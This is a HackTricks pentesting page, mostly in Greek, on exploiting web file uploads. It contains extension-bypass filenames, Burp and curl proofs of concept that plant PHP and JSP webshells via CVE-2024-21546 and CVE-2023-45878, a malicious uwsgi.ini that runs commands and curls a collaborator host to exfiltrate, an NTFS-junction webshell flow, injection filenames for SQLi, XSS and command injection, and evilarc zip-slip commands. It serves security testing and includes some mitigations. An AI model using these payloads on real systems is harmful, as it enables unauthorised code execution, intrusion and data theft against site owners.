# Μεταφόρτωση Αρχείων

{{#include ../../banners/hacktricks-training.md}}

## Γενική Μεθοδολογία Μεταφόρτωσης Αρχείων

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Παράκαμψη ελέγχων επεκτάσεων αρχείων

1. Εφόσον ισχύουν, ελέγξτε τις προηγούμενες επεκτάσεις. Δοκιμάστε επίσης με μερικά **κεφαλαία γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Check **adding a valid extension before** the execution extension (use previous extensions also):_
- _file.png.php_
- _file.png.Php5_
3. Δοκιμάστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε το Burp για να **bruteforce** όλους τους **ascii** και **Unicode** χαρακτήρες. (_Σημείωση ότι μπορείτε επίσης να προσπαθήσετε να χρησιμοποιήσετε τις **προαναφερθείσες** επεκτάσεις_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τις προστασίες εξαπατώντας τον extension parser στην πλευρά του server με τεχνικές όπως **doubling** της **extension** ή **adding junk** δεδομένα (**null** bytes) μεταξύ επεκτάσεων. _Μπορείτε επίσης να χρησιμοποιήσετε τις **previous extensions** για να προετοιμάσετε καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **ένα επιπλέον επίπεδο επεκτάσεων** στην προηγούμενη δοκιμή:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Δοκιμάστε να βάλετε την **exec extension before the valid extension** και ελπίζετε ότι ο server είναι λανθασμένα ρυθμισμένος. (χρήσιμο για εκμετάλλευση λανθασμένων ρυθμίσεων Apache όπου οτιδήποτε με επέκταση **_**.php**_**, αλλά που δεν τελειώνει απαραίτητα σε .php, θα εκτελέσει κώδικα):
- _ex: file.php.png_
7. Χρήση των **NTFS alternate data stream (ADS)** σε **Windows**. Σε αυτή την περίπτωση, θα εισαχθεί ένας χαρακτήρας άνω και κάτω τελείας ":" μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπόμενη. Ως αποτέλεσμα, θα δημιουργηθεί στο server ένα **empty file with the forbidden extension** (π.χ. "file.asax:.jpg”). Αυτό το αρχείο μπορεί να επεξεργαστεί αργότερα χρησιμοποιώντας άλλες τεχνικές όπως τη χρήση του short filename. Το pattern "**::$data**” μπορεί επίσης να χρησιμοποιηθεί για να δημιουργήσει μη-κενά αρχεία. Επομένως, η προσθήκη ενός dot χαρακτήρα μετά από αυτό το pattern μπορεί επίσης να είναι χρήσιμη για την παράκαμψη πρόσθετων περιορισμών (π.χ. "file.asp::$data.”)
8. Προσπαθήστε να υπερβείτε τα όρια του ονόματος αρχείου. Η έγκυρη επέκταση κόβεται. Και μένει η κακόβουλη PHP. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Στη συνέχεια κάντε αίτημα στην αποθηκευμένη διαδρομή (τυπικά σε Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
### Παράκαμψη Content-Type, Magic Number, Compression & Resizing

- Παράκαμψε τους ελέγχους **Content-Type** θέτοντας την **τιμή** της **επικεφαλίδας** **Content-Type** σε: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Παράκαμψε τον έλεγχο **magic number** προσθέτοντας στην αρχή του αρχείου τα **bytes ενός πραγματικού image** (μπερδέψτε την εντολή _file_). Ή εισάγετε το shell μέσα στα **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ή μπορείτε επίσης να **εισάγετε το payload απευθείας** σε μια εικόνα:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Αν γίνεται **συμπίεση στην εικόνα σας**, για παράδειγμα χρησιμοποιώντας κάποιες τυπικές PHP βιβλιοθήκες όπως [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές μπορεί να μην είναι χρήσιμες. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που **θα επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Η σελίδα μπορεί επίσης να **κάνει resizing** στην **εικόνα**, χρησιμοποιώντας για παράδειγμα τις συναρτήσεις PHP-GD `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε το **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που **θα επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Μια άλλη τεχνική για να φτιάξετε ένα payload που **επιβιώνει από το resizing της εικόνας**, χρησιμοποιώντας τη PHP-GD συνάρτηση `thumbnailImage`. Εναλλακτικά, μπορείτε να χρησιμοποιήσετε το **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που **θα επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Άλλα κόλπα προς έλεγχο

- Βρείτε μια ευπάθεια για να **μετονομάσετε** το αρχείο που έχει ήδη ανεβεί (για να αλλάξετε την επέκταση).
- Βρείτε μια ευπάθεια **Local File Inclusion** για να εκτελέσετε το backdoor.
- **Πιθανή διαρροή πληροφοριών**:
1. Ανεβάστε **πολλές φορές** (και την **ίδια στιγμή**) το **ίδιο αρχείο** με το **ίδιο όνομα**
2. Ανεβάστε ένα αρχείο με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Ανεβάζοντας ένα αρχείο με **"." , "..", ή "…" ως όνομα**. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα ανεβασμένα αρχεία στο "/www/uploads/" directory, το filename "." θα δημιουργήσει ένα αρχείο που ονομάζεται
uploads” στον "/www/" κατάλογο.
4. Ανεβάστε ένα αρχείο που δύσκολα διαγράφεται όπως **"…:.jpg"** σε **NTFS**. (Windows)
5. Ανεβάστε ένα αρχείο σε **Windows** με **μη έγκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Ανεβάστε ένα αρχείο σε **Windows** χρησιμοποιώντας **reserved** (**απαγορευμένα**) **ονόματα** όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, και LPT9.
- Δοκιμάστε επίσης να **ανεβάσετε ένα εκτελέσιμο** (.exe) ή ένα **.html** (λιγότερο ύποπτο) το οποίο **θα εκτελέσει κώδικα** όταν ανοίξει κατά λάθος από τον χρήστη.

### Ειδικά κόλπα με επεκτάσεις

Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Τα αρχεία `.phar` είναι σαν τα `.jar` για java, αλλά για php, και μπορούν να **χρησιμοποιηθούν σαν php αρχείο** (εκτελώντας τα με php, ή συμπεριλαμβάνοντάς τα μέσα σε ένα script...)

Η επέκταση `.inc` χρησιμοποιείται μερικές φορές για αρχεία php που χρησιμοποιούνται μόνο για **import files**, οπότε, κάποια στιγμή, ίσως κάποιος να επέτρεψε **αυτή την επέκταση να εκτελείται**.

## **Jetty RCE**

Αν μπορείτε να ανεβάσετε ένα XML αρχείο σε έναν Jetty server μπορείτε να αποκτήσετε [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Έτσι, όπως αναφέρεται στην παρακάτω εικόνα, ανεβάστε το XML αρχείο στο `$JETTY_BASE/webapps/` και περιμένετε το shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Εξετάστε το παρακάτω παράδειγμα ενός κακόβουλου `uwsgi.ini` αρχείου, που παρουσιάζει διάφορα schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
The execution of the payload occurs during the parsing of the configuration file. For the configuration to be activated and parsed, the uWSGI process must either be restarted (potentially after a crash or due to a Denial of Service attack) or the file must be set to auto-reload. The auto-reload feature, if enabled, reloads the file at specified intervals upon detecting changes.

Είναι κρίσιμο να κατανοήσουμε τη χαλαρή φύση της ανάλυσης του αρχείου διαμόρφωσης από τον uWSGI. Συγκεκριμένα, το payload που συζητήθηκε μπορεί να εισαχθεί μέσα σε ένα binary file (such as an image or PDF), διευρύνοντας περαιτέρω το εύρος πιθανής εκμετάλλευσης.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Unauthenticated endpoint in Gibbon LMS allows arbitrary file write inside the web root, leading to pre-auth RCE by dropping a PHP file. Vulnerable versions: up to and including 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (server ignores type/name, base64-decodes the tail)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Ελάχιστο PoC για να γράψετε και να διαβάσετε πίσω ένα αρχείο:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Αποθέστε ένα ελάχιστο webshell και εκτελέστε εντολές:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Σημειώσεις:
- Ο handler εκτελεί `base64_decode($_POST["img"])` μετά το split με `;` και `,`, στη συνέχεια γράφει τα bytes στο `$absolutePath . '/' . $_POST['path']` χωρίς να επικυρώνει extension/type.
- Ο προκύπτων κώδικας τρέχει ως ο χρήστης της web υπηρεσίας (π.χ., XAMPP Apache on Windows).

Αναφορές για αυτό το bug περιλαμβάνουν το usd HeroLab advisory και την εγγραφή στο NVD. Δείτε την ενότητα References παρακάτω.

## **wget File Upload/SSRF Trick**

Σε ορισμένες περιπτώσεις μπορεί να βρείτε ότι ένας server χρησιμοποιεί **`wget`** για να **κατεβάσει αρχεία** και μπορείτε να υποδείξετε το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι το extension των κατεβασμένων αρχείων βρίσκεται σε μια whitelist ώστε να διασφαλιστεί ότι μόνο επιτρεπτά αρχεία θα κατέβουν. Ωστόσο, **αυτός ο έλεγχος μπορεί να παρακαμφθεί.**\
Το **μέγιστο** μήκος ενός **filename** σε **linux** είναι **255**, ωστόσο, **wget** περικόπτει τα ονόματα αρχείων σε **236** χαρακτήρες. Μπορείτε να **κατεβάσετε ένα αρχείο με όνομα "A"*232+".php"+".gif"**, αυτό το όνομα θα **παρακάμψει** τον **έλεγχο** (όπως σε αυτό το παράδειγμα **".gif"** είναι ένα **έγκυρο** extension) αλλά `wget` θα **μετονομάσει** το αρχείο σε **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Σημειώστε ότι **μια άλλη επιλογή** που ίσως σκέφτεστε για να παρακάμψετε αυτόν τον έλεγχο είναι να κάνετε τον **HTTP server redirect to a different file**, έτσι ώστε το αρχικό URL να παρακάμψει τον έλεγχο αλλά στη συνέχεια το wget θα κατεβάσει το redirected αρχείο με το νέο όνομα. Αυτό **δεν θα λειτουργήσει** **εκτός αν** το wget χρησιμοποιείται με την **παράμετρο** `--trust-server-names` επειδή **το wget θα κατεβάσει τη σελίδα μετά το redirect με το όνομα του αρχείου που υποδεικνύεται στο αρχικό URL**.

### Διαφυγή του upload directory μέσω NTFS junctions (Windows)

(Για αυτή την επίθεση θα χρειαστείτε τοπική πρόσβαση στη Windows μηχανή) Όταν τα uploads αποθηκεύονται σε υποφακέλους ανά χρήστη σε Windows (π.χ., C:\Windows\Tasks\Uploads\<id>\) και εσείς ελέγχετε τη δημιουργία/διαγραφή αυτού του υποφακέλου, μπορείτε να τον αντικαταστήσετε με ένα directory junction που δείχνει σε μια ευαίσθητη τοποθεσία (π.χ., το webroot). Τα επόμενα uploads θα γραφτούν στη στοχευμένη διαδρομή, επιτρέποντας code execution αν ο στόχος ερμηνεύει server‑side code.

Παράδειγμα ροής για να ανακατευθύνετε τα uploads στο XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Σημειώσεις
- mklink /J δημιουργεί ένα NTFS directory junction (reparse point). Ο λογαριασμός του web server πρέπει να ακολουθεί το junction και να έχει δικαίωμα εγγραφής στον προορισμό.
- Αυτό ανακατευθύνει αυθαίρετες εγγραφές αρχείων· αν ο προορισμός εκτελεί scripts (PHP/ASP), αυτό γίνεται RCE.
- Μέτρα άμυνας: μην επιτρέπετε writable upload roots να είναι attacker‑controllable κάτω από C:\Windows\Tasks ή παρόμοια· μπλοκάρετε τη δημιουργία junction· επικυρώστε extensions server‑side· αποθηκεύστε uploads σε ξεχωριστό volume ή με deny‑execute ACLs.

### Ανέβασμα σώματος συμπιεσμένου με GZIP + path traversal στο destination param → JSP webshell RCE (Tomcat)

Ορισμένοι upload/ingest handlers γράφουν το raw request body σε ένα filesystem path που κατασκευάζεται από user-controlled query parameters. Αν ο handler επίσης υποστηρίζει Content-Encoding: gzip και αποτύχει να κανονικοποιήσει/επικυρώσει το destination path, μπορείτε να συνδυάσετε directory traversal με ένα gzipped payload για να γράψετε αυθαίρετα bytes σε ένα web-served directory και να αποκτήσετε RCE (π.χ., drop ένα JSP κάτω από τα webapps του Tomcat).

Γενική ροή εκμετάλλευσης:
- Ετοιμάστε το server-side payload (π.χ. minimal JSP webshell) και gzip-compress τα bytes.
- Στείλτε ένα POST όπου ένα path parameter (π.χ., token) περιέχει traversal που διαφεύγει από τον προοριζόμενο φάκελο, και το file υποδεικνύει το όνομα αρχείου για αποθήκευση. Ορίστε Content-Type: application/octet-stream και Content-Encoding: gzip· το body είναι το συμπιεσμένο payload.
- Περιηγηθείτε στο αρχείο που γράφτηκε για να ενεργοποιήσετε την εκτέλεση.

Ενδεικτικό αίτημα:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Στη συνέχεια ενεργοποιήστε:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Σημειώσεις
- Target paths vary by install (e.g., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ in some stacks). Any web-exposed folder that executes JSP will work.
- Burp Suite’s Hackvertor extension can produce a correct gzip body from your payload.
- Αυτό είναι ένα καθαρό pre-auth arbitrary file write → RCE μοτίβο· δεν βασίζεται στο multipart parsing.

Αντιμετώπιση
- Προσδιορίστε τις upload destinations server-side· μην εμπιστεύεστε ποτέ path fragments από clients.
- Κανoνικοποιήστε και επιβάλετε ώστε το resolved path να παραμένει εντός ενός allow-listed base directory.
- Αποθηκεύστε uploads σε non-executable volume και απαγορεύστε την εκτέλεση script από writable paths.

## Εργαλεία

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) είναι ένα ισχυρό εργαλείο σχεδιασμένο να βοηθά Pentesters και Bug Hunters στο testing των file upload μηχανισμών. Χρησιμοποιεί διάφορες bug bounty τεχνικές για να απλοποιήσει τη διαδικασία εντοπισμού και εκμετάλλευσης ευπαθειών, εξασφαλίζοντας ολοκληρωμένες αξιολογήσεις web εφαρμογών.

### Corrupting upload indices with snprintf quirks (historical)

Ορισμένοι legacy upload handlers που χρησιμοποιούν `snprintf()` ή παρόμοιο για να δημιουργήσουν multi-file arrays από ένα single-file upload μπορούν να ξεγελαστούν ώστε να παραποιήσουν τη δομή `_FILES`. Λόγω ασυνεπειών και περικοπών στη συμπεριφορά του `snprintf()`, ένα προσεκτικά διαμορφωμένο single upload μπορεί να εμφανιστεί ως πολλαπλά indexed files στην πλευρά του server, μπερδεύοντας λογική που υποθέτει αυστηρό σχήμα (π.χ., το χειρίζεται ως multi-file upload και παίρνει unsafe branches). Παρόλο που είναι niche σήμερα, αυτό το μοτίβο “index corruption” αναδύεται περιστασιακά σε CTFs και παλαιότερα codebases.

## Από File upload σε άλλες ευπάθειες

- Ορίστε **filename** σε `../../../tmp/lol.png` και προσπαθήστε να επιτύχετε **path traversal**
- Ορίστε **filename** σε `sleep(10)-- -.jpg` και μπορεί να καταφέρετε **SQL injection**
- Ορίστε **filename** σε `<svg onload=alert(document.domain)>` για να επιτύχετε XSS
- Ορίστε **filename** σε `; sleep 10;` για να δοκιμάσετε κάποια command injection (περισσότερα [command injections tricks εδώ](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Δοκιμάστε **different svg payloads** από [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Αν μπορείτε να **υποδείξετε στον web server να λάβει μια εικόνα από ένα URL** μπορείτε να προσπαθήσετε να εκμεταλλευτείτε ένα [SSRF](../ssrf-server-side-request-forgery/index.html). Αν αυτή η **image** πρόκειται να **saved** σε κάποιο **public** site, μπορείτε επίσης να υποδείξετε ένα URL από [https://iplogger.org/invisible/](https://iplogger.org/invisible/) και να **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Ειδικά διαμορφωμένα PDFs για XSS: Η [επόμενη σελίδα παρουσιάζει πώς να **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Αν μπορείτε να ανεβάσετε PDFs, μπορείτε να προετοιμάσετε κάποιο PDF που θα εκτελεί arbitrary JS ακολουθώντας τις δοθείσες οδηγίες.
- Ανεβάστε το \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) περιεχόμενο για να ελέγξετε αν ο server έχει κάποιο **antivirus**
- Ελέγξτε αν υπάρχει κάποιο **size limit** κατά το uploading αρχείων

Ιδού μια λίστα top 10 πραγμάτων που μπορείτε να επιτύχετε ανεβάζοντας (από [εδώ](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Μαγικά Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Ανατρέξτε στο [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) για άλλους τύπους αρχείων.

## Zip/Tar αρχεία που αποσυμπιέζονται αυτόματα κατά το upload

Αν μπορείτε να ανεβάσετε ένα ZIP που πρόκειται να αποσυμπιεστεί στον server, μπορείτε να κάνετε 2 πράγματα:

### Symlink

Ανεβάστε ένα archive που περιέχει soft links προς άλλα αρχεία, και στη συνέχεια, προσπελάζοντας τα αποσυμπιεσμένα αρχεία θα έχετε πρόσβαση στα linked αρχεία:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decompress in different folders

Η απρόσμενη δημιουργία αρχείων σε καταλόγους κατά την αποσυμπίεση είναι ένα σημαντικό πρόβλημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να προστατεύει από OS-level command execution μέσω κακόβουλων ανεβάσματος αρχείων, η ιεραρχική υποστήριξη συμπίεσης και οι δυνατότητες directory traversal της μορφής αρχείου ZIP μπορούν να εκμεταλλευτούν. Αυτό επιτρέπει σε επιτιθέμενους να παρακάμψουν περιορισμούς και να διαφύγουν από ασφαλείς καταλόγους upload χειραγωγώντας τη λειτουργικότητα αποσυμπίεσης της στοχευμένης εφαρμογής.

Υπάρχει διαθέσιμο αυτοματοποιημένο exploit για τη δημιουργία τέτοιων αρχείων στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Το εργαλείο μπορεί να χρησιμοποιηθεί ως εξής:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, η **symlink trick with evilarc** είναι μια πιθανή επιλογή.  
